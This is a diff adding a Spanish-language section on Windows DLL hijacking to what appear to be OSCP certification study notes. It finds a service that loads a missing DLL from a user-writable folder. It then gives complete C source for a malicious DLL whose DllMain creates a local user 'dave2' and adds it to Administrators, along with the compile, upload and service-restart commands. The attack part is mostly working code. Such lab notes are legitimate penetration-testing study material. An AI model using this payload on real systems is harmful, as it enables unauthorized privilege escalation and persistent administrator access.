@@ -214,6 +214,57 @@ Obtener hash NTLM desde un formulario de carga de archivos:
 
     Get-ModifiableServiceFile
 
+### DLL Hijacking
+
+  Buscamos servicios en estado 'Running':
+
+    Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+  Encontramos uno y comprobamos con icacls si tenemos permisos de escritura sobre ese binario, pero no es el caso.
+
+  Abirmos 'ProcMon' y buscamos por el proceso vulnerable, en este caso BetaServ.exe:
+
+   ![image](https://github.com/loqasto/OSCP/assets/111526713/2cd34421-eb13-4d81-a01d-506cba898138)
+
+  Como vemos en la imagen, el binario busca sus propios .dll para ejecutarse. En este caso, bemos que busca myDLL.dll en la carpeta 'Documents' del usuario 'steve'.
+
+  Como estamos logeados con ese usuario, tenemos permisos de escritura ahí. Creamos nuestro .dll malicioso:
+
+      #include <stdlib.h>
+    #include <windows.h>
+    
+    BOOL APIENTRY DllMain(
+    HANDLE hModule,// Handle to DLL module
+    DWORD ul_reason_for_call,// Reason for calling function
+    LPVOID lpReserved ) // Reserved
+    {
+        switch ( ul_reason_for_call )
+        {
+            case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+            int i;
+      	    i = system ("net user dave2 password123! /add");
+      	    i = system ("net localgroup administrators dave2 /add");
+            break;
+            case DLL_THREAD_ATTACH: // A process is creating a new thread.
+            break;
+            case DLL_THREAD_DETACH: // A thread exits normally.
+            break;
+            case DLL_PROCESS_DETACH: // A process unloads the DLL.
+            break;
+        }
+        return TRUE;
+    }
+
+  Lo compilamos:
+
+    x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+
+  Lo subimos a través de 'iwr' y Powershell y lo dejamos en C:\Users\steve\Documents. Reiniciamos el servicio BetaServ:
+
+    Restart-Service BetaService
+
+  Y comprobamos que se han ejecutado nuestros comandos, habiendo creado un usuario dave2 y añadiendóle al grupo Administrators.
+
 ## Vulnerabilidades conocidas
 
 Apache HTTP Server 2.4.49 - Path traversal
